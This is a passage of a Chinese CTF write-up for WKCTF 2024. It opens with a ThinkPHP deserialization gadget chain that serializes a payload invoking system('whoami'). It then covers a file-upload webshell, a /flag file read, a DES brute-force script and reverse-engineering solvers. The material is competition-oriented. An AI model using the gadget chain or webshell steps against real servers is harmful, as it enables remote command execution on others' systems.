class_">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;dir&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span>(<span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/17/2024%E5%B9%B4WKCTF-wp/07/17/2024%E5%B9%B4WKCTF-wp/Untitled.png" class>

<h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p><a target="_blank" rel="noopener" href="http://110.40.35.73:81/favicon.webp%E5%AD%98%E5%9C%A8AKSK%E6%B3%84%E9%9C%B2">http://110.40.35.73:81/favicon.webp存在AKSK泄露</a>: <code>&quot;ba260cf0-2e6b-4a0e-91c1-d52b8c3214a1&quot;</code></p>
<p>文件上传拿到<code>webshell</code>密码：<code>shell</code></p>
<p>蚁剑直连</p>


<h3 id="qiandao"><a href="#qiandao" class="headerlink" title="qiandao"></a>qiandao</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?file=/flag</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><a target="_blank" rel="noopener" href="https://github.com/htr-tech/0xTwin/blob/master/twin_cipher.py">https://github.com/htr-tech/0xTwin/blob/master/twin_cipher.py</a></p>
<p>解码得到<code>base64</code>编码的图片，图片是一个二维码但是扫不出来，找在线工具<a target="_blank" rel="noopener" href="https://cli.im/deqr/other%E5%BE%97%E5%88%B0%EF%BC%9A**%E8%AF%B7%E5%8F%91%E9%80%81">https://cli.im/deqr/other得到：**请发送</a> WKCTF2024 到微信公众号隐雾安全获取flag！**</p>
<p>照做得到<code>flagWKCTF&#123;hello_2024&#125;</code></p>
<h3 id="不套是你的谎言"><a href="#不套是你的谎言" class="headerlink" title="不套是你的谎言"></a>不套是你的谎言</h3><p><code>DES</code>解密+字典爆破 <code>GPT</code>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES  <span class="comment"># 导入DES加密模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex  <span class="comment"># 导入十六进制转字节串的函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sys  <span class="comment"># 导入操作系统和系统模块，用于文件操作和系统级交互</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义DES解密函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)  <span class="comment"># 使用ECB模式初始化DES对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)  <span class="comment"># 返回解密后的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待解密的十六进制数据</span></span><br><span class="line"></span><br><span class="line">data_h = <span class="string">&#x27;5270263d56386adfaf9c18f360eefe4dd151d9f0dbc51b3e8c2ee5d64be8853d19c6b3c2f014cc6c&#x27;</span></span><br><span class="line"></span><br><span class="line">data = a2b_hex(data_h)  <span class="comment"># 将十六进制数据转换为字节串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取密码列表文件</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(os.getcwd() + <span class="string">&quot;\\password_list.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)  <span class="comment"># 打开密码列表文件</span></span><br><span class="line"></span><br><span class="line">l = f.read().split(<span class="string">&#x27;\\n&#x27;</span>)  <span class="comment"># 读取文件内容并按行分割</span></span><br><span class="line"></span><br><span class="line">f.close()  <span class="comment"># 关闭文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历密码列表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> l:</span><br><span class="line"></span><br><span class="line">    x = x.encode()  <span class="comment"># 将密码从字符串转换为字节串</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x) &lt; <span class="number">8</span>:  <span class="comment"># 如果密码长度不足8字节</span></span><br><span class="line"></span><br><span class="line">        x += <span class="string">b&#x27;\\x00&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(x))  <span class="comment"># 补齐至8字节，使用空字节填充</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x) == <span class="number">8</span>:  <span class="comment"># 确认密码长度为8字节</span></span><br><span class="line"></span><br><span class="line">        decrypted_data = des_decrypt(data, x)  <span class="comment"># 使用密码解密数据</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> decrypted_data <span class="keyword">and</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> decrypted_data <span class="keyword">and</span> (<span class="string">b&#x27;C&#x27;</span> <span class="keyword">in</span> decrypted_data <span class="keyword">or</span> <span class="string">b&#x27;c&#x27;</span> <span class="keyword">in</span> decrypted_data):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 打印密码和解密后的数据（假设解密后的数据为可打印的字符串）</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(x.decode(), decrypted_data.decode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 如果解密后的数据不可打印，则跳过本次循环</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="so-easy"><a href="#so-easy" class="headerlink" title="so_easy"></a>so_easy</h3><p>主要函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall Java_com_so_easy_MainActivity_soEasy(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> v5; // r13d</span><br><span class="line">  const char *v6; // rax</span><br><span class="line">  const char *v7; // r12</span><br><span class="line">  size_t v8; // rax</span><br><span class="line">  size_t v9; // r8</span><br><span class="line">  __int64 v10; // rsi</span><br><span class="line">  <span class="built_in">int</span> v11; // edx</span><br><span class="line">  __int64 v12; // rdi</span><br><span class="line">  __int64 v13; // rsi</span><br><span class="line">  __int64 v14; // rdi</span><br><span class="line">  __int64 v15; // rcx</span><br><span class="line">  size_t v16; // rax</span><br><span class="line">  size_t v17; // rcx</span><br><span class="line">  unsigned __int8 v18; // di</span><br><span class="line">  __int128 v20[<span class="number">6</span>]; // [rsp+0h] [rbp-98h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v21; // [rsp+60h] [rbp-38h]</span><br><span class="line">  unsigned __int64 v22; // [rsp+68h] [rbp-30h]</span><br><span class="line"></span><br><span class="line">  v22 = __readfsqword(0x28u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = (const char *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  memset(v20, <span class="number">0</span>, sizeof(v20));</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = strlen(v6);</span><br><span class="line">    v9 = 0LL;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = *(_QWORD *)&amp;v7[v9];</span><br><span class="line">      v11 = <span class="number">255</span>;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = (<span class="number">2</span> * v10) ^ 0x71234EA7D92996F5LL; // 对输入字符串的每个<span class="number">8</span>字节块进行多次位运算:</span><br><span class="line">        <span class="keyword">if</span> ( v10 &gt;= <span class="number">0</span> )</span><br><span class="line">          v12 = <span class="number">2</span> * v10;</span><br><span class="line">        v13 = (<span class="number">2</span> * v12) ^ 0x71234EA7D92996F5LL;</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">          v13 = <span class="number">2</span> * v12;</span><br><span class="line">        v14 = (<span class="number">2</span> * v13) ^ 0x71234EA7D92996F5LL;</span><br><span class="line">        <span class="keyword">if</span> ( v13 &gt;= <span class="number">0</span> )</span><br><span class="line">          v14 = <span class="number">2</span> * v13;</span><br><span class="line">        v15 = (<span class="number">2</span> * v14) ^ 0x71234EA7D92996F5LL;</span><br><span class="line">        <span class="keyword">if</span> ( v14 &gt;= <span class="number">0</span> )</span><br><span class="line">          v15 = <span class="number">2</span> * v14;</span><br><span class="line">        v10 = (<span class="number">2</span> * v15) ^ 0x71234EA7D92996F5LL;</span><br><span class="line">        <span class="keyword">if</span> ( v15 &gt;= <span class="number">0</span> )</span><br><span class="line">          v10 = <span class="number">2</span> * v15;</span><br><span class="line">        v11 -= <span class="number">5</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v11 );</span><br><span class="line">      *(_QWORD *)((char *)v20 + v9) = v10;</span><br><span class="line">      v9 += 8LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &gt; v9 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = strlen(v7);</span><br><span class="line">    v17 = 0LL;</span><br><span class="line">    LOBYTE(v5) = <span class="number">0</span>;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = v5 + (*(_WORD *)((char *)v20 + v17) == *(_WORD *)((char *)&amp;unk_560 + v17));</span><br><span class="line">      v17 += 2LL;</span><br><span class="line">      v5 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v16 &gt; v17 );</span><br><span class="line">  &#125;</span><br><span class="line">  (*(void (__fastcall **)(__int64, __int64, const char *))(*(_QWORD *)a1 + 1360LL))(a1, a3, v7);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多次位分析最后和<code>unk_560</code>比较</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unk_560[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x81</span>, <span class="number">0xBA</span>, <span class="number">0xC1</span>, <span class="number">0xF0</span>, <span class="number">0x95</span>, <span class="number">0x0A</span>, <span class="number">0x54</span>, <span class="number">0x14</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0xE2</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x84</span>, <span class="number">0xF8</span>, <span class="number">0xC9</span>, <span class="number">0x3E</span>, <span class="number">0x14</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xFD</span>, <span class="number">0x09</span>, <span class="number">0x5E</span>, <span class="number">0xAD</span>, <span class="number">0x05</span>, <span class="number">0xB4</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0xC0</span>, <span class="number">0x3F</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 倒序板子</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    arr = <span class="string">&quot;AE81BAC1F0950A5414&quot;</span>  <span class="comment"># 定义字符串</span></span><br><span class="line">    length = <span class="built_in">len</span>(arr)  <span class="comment"># 获取字符串长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用for循环反向打印字符串的前半部分</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(arr[length - <span class="number">2</span> * i - <span class="number">2</span>], end=<span class="string">&#x27;&#x27;</span>)  <span class="comment"># 打印字符，并使用空字符串&#x27;&#x27;作为分隔符</span></span><br><span class="line">        <span class="built_in">print</span>(arr[length - <span class="number">2</span> * i - <span class="number">1</span>], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()  <span class="comment"># 打印换行符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line"> <span class="comment"># CRC32板子</span></span><br><span class="line">secret = [<span class="number">0x540A95F0C1BA81AE</span>,<span class="number">0xF8844E52E24A0314</span>,<span class="number">0x9FD988F98143EC9</span>,<span class="number">0x3FC00F01B405AD5E</span>]</span><br><span class="line">key = <span class="number">0x71234EA7D92996F5</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> secret:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        sign = s &amp; <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">if</span> sign == <span class="number">1</span>:</span><br><span class="line">            s ^= key</span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">        <span class="comment"># 防止负值除2，溢出为正值</span></span><br><span class="line">        <span class="keyword">if</span> sign == <span class="number">1</span>:</span><br><span class="line">            s |= <span class="number">0x8000000000000000</span>  </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; <span class="number">8</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(s &amp; <span class="number">0xFF</span>) </span><br><span class="line">        s &gt;&gt;= <span class="number">8</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="quite-easy"><a href="#quite-easy" class="headerlink" title="quite_easy"></a>quite_easy</h3><p>目测是一个<code>TLS</code></p>
<p>花指令去掉了</p>
<p>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">.text:                 nop</span><br><span class="line">.text:00407C83                 nop</span><br><span class="line">.text:00407C84                 nop</span><br><span class="line">.text:00407C85                 nop</span><br><span class="line">.text:00407C86                 nop</span><br><span class="line">.text:00407C87                 nop</span><br><span class="line">.text:00407C88                 nop</span><br><span class="line">.text:00407C89                 nop</span><br><span class="line">.text:00407C8A                 nop</span><br><span class="line">.text:00407C8B                 nop</span><br><span class="line">.text:00407C8C                 nop</span><br><span class="line">.text:00407C8D                 nop</span><br><span class="line">.text:00407C8E                 nop</span><br><span class="line">.text:00407C8F                 nop</span><br><span class="line">.text:00407C90                 nop</span><br><span class="line">基于rand的一个简单加密 </span><br><span class="line"><span class="built_in">int</span> __cdecl sub_40A5A0(char *Str, <span class="built_in">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v2; // eax</span><br><span class="line">  char v3; // al</span><br><span class="line">  char v4; // si</span><br><span class="line">  char v5; // si</span><br><span class="line">  char v6; // di</span><br><span class="line">  _BYTE *v7; // eax</span><br><span class="line">  char v8; // si</span><br><span class="line">  char v9; // si</span><br><span class="line">  char v10; // di</span><br><span class="line">  _BYTE *v11; // eax</span><br><span class="line">  const char *v12; // eax</span><br><span class="line">  _BYTE *v14; // [esp+10h] [ebp-158h]</span><br><span class="line">  <span class="built_in">int</span> v15; // [esp+18h] [ebp-150h]</span><br><span class="line">  <span class="built_in">int</span> m; // [esp+E4h] [ebp-84h]</span><br><span class="line">  <span class="built_in">int</span> k; // [esp+F0h] [ebp-78h]</span><br><span class="line">  <span class="built_in">int</span> j; // [esp+FCh] [ebp-6Ch]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+108h] [ebp-60h]</span><br><span class="line">  char v20[<span class="number">36</span>]; // [esp+114h] [ebp-54h] BYREF</span><br><span class="line">  char v21[<span class="number">32</span>]; // [esp+138h] [ebp-30h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v22; // [esp+164h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41A036);</span><br><span class="line">  sub_40111D(Str);</span><br><span class="line">  v22 = <span class="number">1</span>;</span><br><span class="line">  sub_40111D(&amp;::Str);</span><br><span class="line">  v2 = sub_401663(v21);</span><br><span class="line">  srand(v2 + <span class="number">89</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = rand();</span><br><span class="line">    sub_4013E3(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401663(v21) != <span class="number">48</span> )</span><br><span class="line">    exit(<span class="number">99</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *sub_4010DC(j);</span><br><span class="line">    v5 = *sub_4010DC(j + <span class="number">32</span>) ^ v4;</span><br><span class="line">    v6 = *sub_4010DC(j);</span><br><span class="line">    v7 = sub_4010DC(j + <span class="number">32</span>);</span><br><span class="line">    sub_4013E3(~(*v7 &amp; v6) &amp; v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">16</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *sub_4010DC(k);</span><br><span class="line">    v9 = *sub_4010DC(k - <span class="number">16</span>) ^ v8;</span><br><span class="line">    v10 = *sub_4010DC(k);</span><br><span class="line">    v11 = sub_4010DC(k - <span class="number">16</span>);</span><br><span class="line">    sub_4013E3(~(*v11 &amp; v10) &amp; v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">32</span>; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = sub_4010DC(m);</span><br><span class="line">    *v14 -= *(m + a2);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401460();</span><br><span class="line">  v12 = sub_4014E7(v20);</span><br><span class="line">  v15 = strcmp(v12, Str2);</span><br><span class="line">  LOBYTE(v22) = <span class="number">0</span>;</span><br><span class="line">  sub_401357(v20);</span><br><span class="line">  v22 = -<span class="number">1</span>;</span><br><span class="line">  sub_401357(v21);</span><br><span class="line">  <span class="keyword">return</span> v15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考点基本就是<code>antidebug</code>动静结合得到加密流程</p>
<p><code>rand</code>得到<code>ke</code>后前<code>16</code>个与其异或后<code>16</code>个和前<code>16</code>个异或进行</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt; // For srand() and rand()</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">int</span> ke[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">int</span> temp[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; <span class="number">255</span>; k++) &#123;</span><br><span class="line">        srand(k + <span class="number">89</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            ke[i] = rand() &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char flag[<span class="number">33</span>] = <span class="string">&quot;flag&#123;ed1d665e6516a37ab09f0b7a40&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">int</span> data[<span class="number">33</span>] = &#123;<span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x6F</span>, <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x03</span>, <span class="number">0x98</span>, <span class="number">0x8C</span>, <span class="number">0xB4</span>, <span class="number">0x5B</span>,</span><br><span class="line">                         